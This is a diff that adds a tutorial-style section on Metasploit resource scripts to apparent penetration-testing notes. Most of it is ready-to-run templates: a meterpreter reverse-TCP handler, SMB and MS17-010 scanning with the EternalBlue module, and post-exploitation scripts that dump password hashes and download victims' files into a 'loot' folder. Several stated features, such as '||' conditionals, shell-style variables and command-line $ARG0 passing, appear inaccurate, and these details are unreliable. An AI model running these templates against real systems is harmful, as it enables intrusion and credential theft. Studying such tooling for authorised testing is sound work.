@@ -1958,6 +1958,339 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f 
 
 
 
+# 9. Resource Scripts
+
+### What Are Resource Scripts?
+
+- Resource scripts (`.rc` files) are text files containing Metasploit commands that run automatically.
+- Instead of typing the same setup commands every time, you save them to a file and load them.
+
+**Use cases:**
+- Automated listener setup
+- Consistent workspace configuration
+- Repeating the same scan across multiple targets
+- Saving complex exploit chains
+
+---
+
+### Basic Resource Script Example
+
+- Create a file called `listener.rc`:
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+run -j
+```
+
+- **Run it:**
+
+```bash
+msfconsole -r listener.rc
+```
+
+- Metasploit executes every command in the file in order.
+
+
+
+## Running Resource Scripts
+
+|Method |Command|
+|----|----|
+|From command line| msfconsole -r script.rc|
+|From inside msfconsole| resource script.rc|
+|From inside msfconsole (shortcut) |resource script.rc|
+|From Meterpreter session| run resource script.rc|
+
+
+## Full Automation Example
+
+- **File: setup.rc**
+
+
+- Database setup
+```bash
+db_connect postgresql://user:pass@localhost/msf
+workspace -a TargetProject
+```
+- Load external modules if needed
+```bash
+loadpath /path/to/custom/modules
+```
+- Set up handler
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+run -j
+```
+- Print status
+```bash
+echo "[*] Handler running. Waiting for connections..."
+```
+
+- **Run it:**
+
+```bash
+msfconsole -r setup.rc
+```
+
+
+## Multi-Stage Resource Scripts
+
+- You can chain scripts together.
+
+- **File: stage1.rc**
+
+```bash
+workspace -a Engagement
+db_import /home/user/nmap_scan.xml
+hosts -R
+```
+
+- **File: stage2.rc**
+
+```bash
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS file:/tmp/ip_list.txt
+set THREADS 10
+run
+```
+
+- **Run them sequentially:**
+
+```bash
+msfconsole -r stage1.rc -r stage2.rc
+```
+
+  - **Or from inside msfconsole:**
+
+```bash
+msf6 > resource stage1.rc
+msf6 > resource stage2.rc
+```
+
+## Meterpreter Resource Scripts
+
+- You can also run resource scripts from inside a Meterpreter session.
+
+- **File: collect.rc**
+
+```bash
+getuid
+sysinfo
+hashdump
+screenshot
+run post/windows/gather/enum_logged_on_users
+download C:\Users\Administrator\Desktop\*.txt /tmp/loot/
+```
+
+- **Run it from Meterpreter:**
+
+```bash 
+meterpreter > run resource collect.rc
+```
+
+
+## Advanced Resource Script Features
+
+- **Variables**
+  
+
+   - Set a variable
+       ```bash
+       set VARNAME value
+       ```
+    - Use it later
+      ```bash
+      echo $VARNAME
+      ```
+
+- **Conditional execution**
+
+
+- If a command fails, continue anyway
+```bash
+db_import /path/to/file.xml || echo "Import failed, continuing..."
+```
+
+- **Comments (use #)**
+
+
+  - This is a comment:
+```bash
+set LHOST 192.168.1.5   # This is also a comment
+```
+
+
+## Common Resource Script Templates
+
+- **Handler template (handler.rc):**
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+```
+
+- **Scanner template (scanner.rc):**
+
+```bash
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 1-1000
+set THREADS 10
+run
+hosts -R
+services -u
+```
+
+- **Full engagement template (engagement.rc):**
+
+```bash
+workspace -a $ARG0
+db_import /home/user/$ARG0_nmap.xml
+hosts -R
+use auxiliary/scanner/smb/smb_version
+set RHOSTS file:/tmp/hosts.txt
+run
+services -p 445
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS file:/tmp/smb_hosts.txt
+check
+```
+
+- **Run with argument:**
+
+```bash
+msfconsole -q -r engagement.rc TargetCorp
+```
+- ($ARG0 becomes "TargetCorp")
+
+
+## Creating a Persistent Resource Script
+
+- Save your preferred environment setup in **~/.msf4/msfconsole.rc.** Metasploit runs this file automatically on startup.
+
+- **Example ~/.msf4/msfconsole.rc:**
+
+```bash
+db_connect postgresql://user:pass@localhost/msf
+loadpath /opt/custom-modules
+setg LHOST 192.168.1.5
+setg LPORT 4444
+echo "[*] Environment loaded. Happy hacking."
+```
+
+Now every time you run **msfconsole**, your environment is pre-configured.
+
+
+
+## Resource Scripts vs. Aliases
+
+|Feature| Resource Script| Alias|
+|----|----|----|
+|Saves commands| Yes| Limited|
+|Supports arguments |Yes (with $ARG0, $ARG1) |No|
+|Runs files| Yes| No|
+|Multi-line| Yes| No|
+|Complexity| High |Low|
+
+- **Alias example (in msfconsole):**
+
+```bash
+alias h setg LHOST 192.168.1.5; setg LPORT 4444
+```
+
+- Now typing **h** sets your global listener
+
+
+
+## Practical Examples
+
+- **Example 1: Quick listener**
+
+```bash
+# save as listen.rc
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+run
+```
+
+- **Example 2: SMB scan chain**
+
+```bash
+# save as smb_scan.rc
+workspace -a SMB_Engagement
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+set THREADS 10
+run
+services -p 445 -u
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS file:/tmp/445_hosts.txt
+run
+```
+
+- **Example 3: Post-exploitation collection**
+
+```bash
+# save as collect.rc
+getuid
+sysinfo
+ifconfig
+route
+hashdump
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/checkvm
+run post/windows/gather/enum_applications
+download C:\Users\*\Desktop\*.txt /tmp/loot/
+screenshot
+```
+
+
+## Cheat Sheet
+
+|Task |Command|
+|----|----|
+|Run script from command line| msfconsole -r script.rc|
+|Run script from msfconsole| resource script.rc|
+|Run script from Meterpreter| run resource script.rc|
+|Auto-run script on startup| Save to ~/.msf4/msfconsole.rc|
+|Use arguments| $ARG0, $ARG1 in script|
+|Comment| # Comment text|
+|Set variable |set VARNAME value|
+|Use variable| echo $VARNAME|
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
